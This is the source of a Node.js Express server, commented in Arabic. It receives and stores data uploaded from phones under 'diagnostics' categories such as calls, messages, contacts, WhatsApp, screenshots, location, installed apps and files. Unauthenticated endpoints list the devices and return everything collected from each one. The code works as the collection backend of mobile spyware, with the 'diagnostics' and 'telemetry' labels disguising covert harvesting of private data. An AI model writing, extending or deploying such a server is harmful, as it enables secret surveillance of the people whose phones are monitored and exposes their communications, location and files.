const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, 'database.json');

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

app.use(express.static(__dirname));

// قراءة قاعدة البيانات
function readDB() {
    if (!fs.existsSync(DB_FILE)) {
        return { devices: {}, diagnostics: {} };
    }
    try {
        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    } catch (e) {
        return { devices: {}, diagnostics: {} };
    }
}

// كتابة قاعدة البيانات
function writeDB(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

// تنظيف النصوص
function cleanStr(str, maxLen = 1024) {
    if (typeof str !== 'string') return '';
    // لا نقص أي شيء، فقط نزيل الرموز الخطيرة
    return str.substring(0, maxLen).replace(/[<>]/g, '');
}

// تنظيف معرف الجهاز
function cleanId(id) {
    return cleanStr(id, 64).replace(/[^a-zA-Z0-9_-]/g, '');
}

// ============ المسارات ============

// مسار استقبال الـ Telemetry
app.post("/api/telemetry", (req, res) => {
    const db = readDB();
    const deviceId = cleanId(req.body?.deviceId || "unknown");
    db.devices = db.devices || {};
    db.devices[deviceId] = {
        model: cleanStr(req.body?.model || deviceId),
        battery: req.body?.battery,
        lastSeen: Date.now()
    };
    writeDB(db);
    res.json({ ok: true });
});

// ** المسار الرئيسي لاستقبال البيانات من التطبيق **
app.post("/api/diagnostics/:category", (req, res) => {
    const id = cleanId(cleanStr(req.body?.deviceId, 64));
    const category = cleanStr(req.params.category, 16);
    
    const allowed = ["calls", "messages", "contacts", "media", "whatsapp", "screenshots", "location", "network", "apps", "ping", "filemanager"];
    if (!id || !allowed.includes(category)) {
        return res.status(400).json({ error: "Invalid request or category" });
    }

    const db = readDB();
    if (!db.diagnostics) db.diagnostics = {};
    if (!db.diagnostics[id]) db.diagnostics[id] = {};
    
    // ** تخزين كل العناصر بدون حد **
    db.diagnostics[id][category] = {
        updatedAt: Date.now(),
        count: Number(req.body?.count) || (Array.isArray(req.body?.items) ? req.body.items.length : 0),
        items: Array.isArray(req.body?.items) ? req.body.items.map(i => cleanStr(i, 2048)) : [],
    };

    // تسجيل الجهاز تلقائياً
    if (!db.devices) db.devices = {};
    db.devices[id] = {
        model: id,
        lastSeen: Date.now()
    };
    
    writeDB(db);
    res.json({ ok: true, received: db.diagnostics[id][category].count });
});

// ** مسار جلب قائمة الأجهزة **
app.get("/api/devices", (req, res) => {
    const db = readDB();
    const diagnosticsKeys = Object.keys(db.diagnostics || {});
    const devicesKeys = Object.keys(db.devices || {});
    const allIds = [...new Set([...diagnosticsKeys, ...devicesKeys])];
    
    const devices = allIds.map(k => ({
        id: k,
        model: db.devices?.[k]?.model || k,
        status: "online",
        lastSeen: db.devices?.[k]?.lastSeen || 0
    }));
    
    res.json({ devices });
});

// ** مسار جلب كل بيانات جهاز معين **
app.get("/api/diagnostics/:id", (req, res) => {
    const id = cleanId(req.params.id);
    const db = readDB();
    const diagnostics = db.diagnostics?.[id] || {};
    res.json({ diagnostics });
});

// ** مسار جلب بيانات فئة محددة فقط **
app.get("/api/diagnostics/:id/:category", (req, res) => {
    const id = cleanId(req.params.id);
    const category = cleanStr(req.params.category, 16);
    const db = readDB();
    const data = db.diagnostics?.[id]?.[category] || { items: [], count: 0 };
    res.json(data);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});